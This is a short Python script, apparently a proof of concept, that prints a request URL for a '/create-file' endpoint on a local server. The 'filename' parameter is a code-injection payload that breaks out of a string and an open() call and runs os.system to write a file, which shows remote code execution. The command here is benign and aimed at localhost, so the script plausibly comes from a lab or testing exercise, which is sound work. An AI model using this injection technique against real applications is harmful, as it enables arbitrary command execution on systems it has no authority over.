from urllib.parse import urlencode

filename = "test', 'w') as f: import os; os.system('echo \"Hello, RCE!\" > rce_output.txt')#"
encoded_filename = urlencode({"filename": filename})
print("http://localhost:8081/create-file?" + encoded_filename)